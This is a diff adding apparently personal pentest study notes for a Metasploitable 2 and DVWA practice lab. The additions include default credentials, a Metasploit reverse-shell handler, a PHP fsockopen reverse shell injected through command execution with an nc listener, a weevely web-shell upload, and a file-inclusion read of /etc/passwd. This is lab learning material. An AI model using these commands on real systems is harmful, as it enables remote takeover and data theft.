@@ -1240,3 +1240,44 @@ sqlmap -u http://xxxx/?username=xxx -T tName -D dbName
 
 ### owasp zap
 scan policy
+
+### https://docs.rapid7.com/metasploit/metasploitable-2/
+
+The login for Metasploitable 2 is msfadmin:msfadmin.
+
+https://medium.com/hacker-toolbelt/metasploitable-2-i-lab-setup-8cd4472d7958
+https://resources.infosecinstitute.com/topic/running-metasploitable2-on-virtualbox/
+https://www.offensive-security.com/metasploit-unleashed/requirements/
+
+## webpent
+### metaspoitable/ＤＶＷＡ
+admin/password
+setting:
+  DVWA security/ script security/low
+
+start:
+  command Execution
+  google: reverse shell commands
+  http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+  msfconsole
+  use exploit/multi/handler
+  set PAYLOAD windows/meterpreter/reverse_tcp
+  set LHOST 10.0.2.15
+  set LPORT 5050
+  exploit
+
+  10.0.2.15 ; php -r '$sock=fsockopen("10.0.2.15",5050);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+nc -vv -l -p 5050
+
+### file upload
+weevely 
+weevely generate 11111 ./1.php
+
+http://10.0.2.14/dvwa//hackable/uploads/1.php
+weevely http://10.0.2.14/dvwa//hackable/uploads/1.php 11111
+
+### file inclusion
+
+http://10.0.2.14/dvwa/vulnerablities/fi/?page=/etc/passwd
